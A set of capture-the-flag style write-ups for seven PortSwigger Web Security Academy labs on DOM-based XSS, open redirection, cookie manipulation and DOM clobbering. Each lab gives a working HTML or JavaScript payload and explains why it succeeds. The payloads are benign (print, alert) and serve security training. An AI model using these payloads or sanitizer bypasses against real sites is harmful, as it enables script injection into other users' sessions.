# DOM-Based Vulnerabilities Labs 01-07 — Proof of Concept Writeups

This document contains structured Proof of Concept (PoC) writeups for DOM-based vulnerability Labs 01 to 07 from the PortSwigger Web Security Academy.

---

## Lab 01 — DOM XSS using web messages

- **Goal:** Trigger `print()` using the web message interface.
- **Vulnerability:** Unsafe `message` event handler writing directly to `innerHTML`.

### Proof of Concept (PoC)
1. Host the following exploit payload in the exploit server:
```html
<iframe src="https://<lab-id>.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')"></iframe>
```
2. Deliver the exploit to the victim.

### Why It Works
The target website listens to `message` events via `window.addEventListener('message', ...)` and sets `innerHTML` to the raw data received. Because it does not validate the sender's origin, the attacker's iframe can send a payload containing an image tag with an `onerror` attribute, triggering execution.

---

## Lab 02 — DOM XSS using web messages and a JavaScript URL

- **Goal:** Trigger `print()` using web messages.
- **Vulnerability:** Open redirection sink using `location.href` inside a message event handler, bypassed using string matching.

### Proof of Concept (PoC)
1. Host the following exploit payload in the exploit server:
```html
<iframe src="https://<lab-id>.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
```
2. Deliver the exploit to the victim.

### Why It Works
The message listener checks if the incoming string contains `http:` or `https:` using `indexOf`. By injecting `javascript:print()//http:`, the string validation check is bypassed. The server passes the payload directly to `location.href`, executing the `javascript:` routine.

---

## Lab 03 — DOM XSS using web messages and JSON.parse

- **Goal:** Trigger `print()` using web messages.
- **Vulnerability:** JSON message parsing logic maps URL fields to iframe sources without validation.

### Proof of Concept (PoC)
1. Host the following exploit payload in the exploit server:
```html
<iframe src="https://<lab-id>.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe>
```
2. Deliver the exploit to the victim.

### Why It Works
The event listener parses the incoming payload using `JSON.parse` and redirects the iframe `src` to `d.url` if `type` matches `load-channel`. Supplying the `javascript:` pseudo-protocol in the `"url"` parameter executes code within the target application context.

---

## Lab 04 — DOM-based open redirection

- **Goal:** Force open redirect to the exploit server.
- **Vulnerability:** URL execution inside a dynamic "Back" link.

### Proof of Concept (PoC)
1. Force the victim to visit the target URL containing the redirection query parameter:
   `https://<lab-id>.web-security-academy.net/post?postId=4&url=https://exploit-server.net/`
2. The page loads the back button containing:
   `onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'`
3. The victim clicks "Back to Blog", parsing the `url` value into `location.href` and triggering the redirect.

### Why It Works
The script extracts the query parameter `url` from the current page path using a regex matcher, then binds the matched string value directly to `location.href` upon clicking the anchor tag.

---

## Lab 05 — DOM-based cookie manipulation

- **Goal:** Leverage cookie manipulation to execute XSS.
- **Vulnerability:** Unsanitized URL parameter inputs written to cookies, which are then rendered into `innerHTML`.

### Proof of Concept (PoC)
1. Host the following exploit payload in the exploit server:
```html
<iframe src="https://<lab-id>.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://<lab-id>.web-security-academy.net';window.x=1;"></iframe>
```
2. Deliver the exploit. The victim visits the product page containing XSS markup, saving it inside the `lastViewedProduct` cookie. They are then redirected to the homepage, where the cookie value is rendered and executed.

### Why It Works
The script sets `document.cookie` based on `window.location`. By navigating to the product page with XSS payloads appended to the query parameters, the cookie is populated with the exploit script. When the home page loads, it parses the cookie and renders it dynamically using `innerHTML`.

---

## Lab 06 — Exploiting DOM clobbering to enable XSS

- **Goal:** Execute `alert(1)` using DOM Clobbering.
- **Vulnerability:** Default avatar fallback uses global namespace variables.

### Proof of Concept (PoC)
1. Post a blog comment containing the following HTML structure:
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"></a></a>
```
2. Reload the page to execute the XSS payload.

### Why It Works
The page uses the following code to render user avatars:
`let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}`
By posting two matching `a` tags with `id="defaultAvatar"`, we overwrite (clobber) `window.defaultAvatar` as a DOM collection. The nested `name="avatar"` property exposes the URL value to `defaultAvatar.avatar`, resulting in an image element src set to `"cid:"onerror=alert(1)//"`, executing code.

---

## Lab 07 — Clobbering DOM attributes to bypass HTML filters

- **Goal:** Bypass `htmlJanitor` filter using DOM Clobbering to trigger `print()`.
- **Vulnerability:** Sanitization logic attributes lookup loop bypass.

### Proof of Concept (PoC)
1. Submit a comment containing the form payload:
```html
<form id=x tabindex=0 onfocus=print()><input id=attributes></form>
```
2. Host the redirect script on the exploit server to navigate the victim to the specific post hash:
```html
<iframe src="https://<lab-id>.web-security-academy.net/post?postId=3" onload="setTimeout(()=>this.src=this.src+'#x',500)"></iframe>
```
3. Deliver the exploit to trigger focus on the form.

### Why It Works
The `htmlJanitor` library attempts to sanitize parameters by loops like `for (let i = 0; i < element.attributes.length; i++)`. Injecting `<input id=attributes>` replaces the form's `attributes` property. Since the input element lacks a `length` attribute, the loops fail to execute, bypassing WAF restrictions.
